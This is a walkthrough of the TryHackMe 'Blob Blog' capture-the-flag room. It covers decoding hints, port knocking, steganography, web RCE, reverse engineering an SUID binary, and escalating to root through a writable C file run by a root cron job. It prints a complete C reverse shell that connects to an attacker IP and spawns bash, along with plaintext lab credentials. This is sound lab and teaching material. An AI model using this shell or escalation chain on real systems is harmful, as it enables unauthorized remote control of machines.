# 53 - The Blob Blog (Port Knocking, Reverse Engineering, C)

Room Link --> [https://tryhackme.com/room/theblobblog](https://tryhackme.com/room/theblobblog)

The author of the room wrote a blog on how to create a [vulnerable](https://bobloblaw321.wixsite.com/website/post/the-making-of-a-vulnerable-machine-blob-blog) machine / room on thm.

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -v 10.10.81.199 -p- -sV
```
{% endcode %}

Checking the source code we see a base64 encoded cipher.

{% code overflow="wrap" lineNumbers="true" %}
```bash
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==

# and another 
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```
{% endcode %}

<figure><img src=".gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

New credentials -> `bob :` `cUpC4k3s`&#x20;

Decoded with cyberchef. We got some cipher encoded using BrainFuck Language.

{% code overflow="wrap" %}
```bash
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```
{% endcode %}

Decoded using [here](https://www.dcode.fr/brainfuck-language)

{% code overflow="wrap" %}
```bash
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!

```
{% endcode %}

So we use `knock` utility in kali to knock on the ports

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ knock 10.10.81.199 1 3 5
```

<figure><img src=".gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Then on scanning with nmap, new ports were open.

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -v 10.10.81.199 -sV

21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3
```
{% endcode %}

We login FTP with `bob` credentials successfully.

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We got a `cool.jpeg` image from the ftp server.

Navigating to `10.10.42.235:445` we get anothere password:

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`bob : p@55w0rd` .

I tried the password for that \`cool.jpeg image and it worked.

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ steghide extract -sf cool.jpeg                 
Enter passphrase: 
wrote extracted data to "out.txt".

# content of out.txt.
┌──(dking㉿dking)-[~/Downloads]
└─$ cat out.txt                                                
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff

```

Looks like a vigenere cipher.

Navigating to: `http://10.10.42.235:445/bobs_safe_for_stuff`&#x20;

```
youmayenter
```

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So to decrypt the Vigenere key i used this [site](https://www.dcode.fr/vigenere-cipher?\_\_r=1.3969e56e2ca584f2ba8e04297d1a0c6e) and `youmayenter` as the key.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Decoded ciper --> `bob:d1ff3r3ntP@55w0rd` .

So i did Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ gobuster dir -u http://10.10.42.235:445/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,html,php,db.sql -b 400,404,503,403

/user
```
{% endcode %}

Navigating the link: `http://10.10.42.235:445/user`

We get a ssh priv key, probably for bob.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The key was outputing some kind of error, so i moved on. Enumerating port `8080` .

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ gobuster dir -u http://10.10.42.235:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error

/login
/review
/blog2
```
{% endcode %}

### Initial Access

All redirects to `/login` . Now trying the new credential we found  `bob : d1ff3r3ntP@55w0rd`

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I clicked all links, wanted to try parameter bruteforce but then i tried to enter a cmd, and since whatever we enter is been outputed in the `/review` dir, i discovered we have RCE.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I used this to get Reverse shell.

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to bobloblaw

Now that we have access as www-data, it doesn't look like we actually have access to anything useful, or can access the user's home directory. So I look around for something that may lead to privesc. The first thing I always like to look at is sudo privileges. Unfortunately, we had none here. The next thing I like to look for is SUID binaries. I do that with this command:\


<figure><img src="https://static.wixstatic.com/media/3cee38_418654e0ef774ffbbd79ded1da19da9a~mv2.png/v1/fill/w_509,h_295,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_418654e0ef774ffbbd79ded1da19da9a~mv2.png" alt=""><figcaption></figcaption></figure>

```
find / -perm -4000 2>/dev/null
```

Looking at that list, most of that looks pretty normal, except for \`blogFeeback\`, that's definitely out of place. Running it to see what it does for us:

<figure><img src="https://static.wixstatic.com/media/3cee38_f312119ab9f24a8abb8f1935c9db1d07~mv2.png/v1/fill/w_509,h_50,al_c,lg_1,q_85,enc_auto/3cee38_f312119ab9f24a8abb8f1935c9db1d07~mv2.png" alt=""><figcaption></figcaption></figure>

It doesn't seem like it does much. So let's try some reverse engineering! I like doing RE with ghidra. So to do that, I have to get the blog over to my kali machine:

<figure><img src="https://static.wixstatic.com/media/3cee38_6ba9440f0a71465e8a056c9e72c938e8~mv2.png/v1/fill/w_509,h_73,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_6ba9440f0a71465e8a056c9e72c938e8~mv2.png" alt=""><figcaption></figcaption></figure>

I do that with a python server on the target machine and retrieve it with a wget on my attacker machine. Once this is done, I use ghidra to inspect the binary:

<figure><img src="https://static.wixstatic.com/media/3cee38_78a3524bcee444febb8aa1a331426ac9~mv2.png/v1/fill/w_509,h_437,al_c,lg_1,q_85,enc_auto/3cee38_78a3524bcee444febb8aa1a331426ac9~mv2.png" alt=""><figcaption></figcaption></figure>

It looks like the program is actually spawning a shell if certain conditions are met. Looking closely at the code, it's looping from 1-7, and then taking 7- whatever is in that loop and checking it with an input. If the input doesn't properly match, it exits the program. On each iteration, \`iVar1\` is shifting to the next parameter being inputted. This means it's looking for 6 parameters in reverse order to be able to get to that shell spawn. So trying this on the binary:

<figure><img src="https://static.wixstatic.com/media/3cee38_86b20375841242c292a3d99aa3344dbe~mv2.png/v1/fill/w_509,h_119,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_86b20375841242c292a3d99aa3344dbe~mv2.png" alt=""><figcaption></figcaption></figure>

We get user! And we can now read the user flag:

### Priv Esc to Root

While escalating to user, you should have noticed a weird message being printed out periodically:

<figure><img src="https://static.wixstatic.com/media/3cee38_7179f5768a4c4777857f3c88376bd4d2~mv2.png/v1/fill/w_509,h_45,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_7179f5768a4c4777857f3c88376bd4d2~mv2.png" alt=""><figcaption></figcaption></figure>

That's a scheduled process since it's happening every so often. I can't find something that's printing that looking at the normal crontab, so I bring pspy over instead and wait for a message to print to see where that is coming from:

Getting pspy:

I made it executable and then ran it and eventually saw this:

<figure><img src="https://static.wixstatic.com/media/3cee38_7ed947f0df844c39a92b165ad4660ffa~mv2.png/v1/fill/w_509,h_14,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_7ed947f0df844c39a92b165ad4660ffa~mv2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://static.wixstatic.com/media/3cee38_1040086a3f724f70a97508c5c4c67825~mv2.png/v1/fill/w_509,h_148,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_1040086a3f724f70a97508c5c4c67825~mv2.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
/bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/.also_boring/.still_boring
```
{% endcode %}

That's very hard to see, but what the process seems to be doing is compiling a C file, changing it to executable, running it, and then deleting it. The key here, though, is that it's being run as root! So we have found our escalation path. If we have access to that file and can write to it, we can upload a reverse shell. Let's check if that's the case:

<figure><img src="https://static.wixstatic.com/media/3cee38_27132d4b42d948a0b76e38634acc5c9b~mv2.png/v1/fill/w_509,h_98,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/3cee38_27132d4b42d948a0b76e38634acc5c9b~mv2.png" alt=""><figcaption></figcaption></figure>

I was able to find the file, and looking at the permissions, user \`bobloblaw\` indeed has write permissions! Now i replace the code with a C reverse shell.

So i went to `revshells.com` and generated a C rev shell:

{% code overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 1234;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.18.88.214");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;       
}
```
{% endcode %}

Setup NC listener and replace the file. And i got root.

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Done!

